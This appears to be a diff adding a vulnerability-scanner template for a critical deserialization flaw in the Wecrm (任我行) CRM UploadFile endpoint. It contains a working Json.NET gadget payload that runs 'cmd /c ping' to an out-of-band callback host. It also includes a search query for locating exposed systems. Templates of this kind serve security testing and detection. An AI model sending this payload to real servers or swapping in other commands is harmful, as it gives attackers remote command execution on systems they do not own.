@@ -1,0 +1,36 @@
+id: wecrm-uploadfile-deserialization
+
+info:
+  name: Wecrm CRM UploadFile Deserialization
+  author: Co5mos
+  severity: critical
+  description: |
+    任我行CRM系统的 `UploadFile` 接口存在反序列化漏洞，攻击者可以利用该漏洞执行任意命令，从而获取服务器权限。
+  metadata:
+    fofa-query: "欢迎使用任我行CRM"
+  tags: wecrm, deserialization, rce
+
+http:
+  - raw:
+      - |
+        POST /SystemManage/UploadFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        photoInfo={
+          '$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+          'MethodName': 'Start',
+          'MethodParameters': {
+            '$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+            '$values': ['cmd', '/c ping {{interactsh-url}}']
+          },
+          'ObjectInstance': {
+            '$type': 'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
+          }
+        }
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
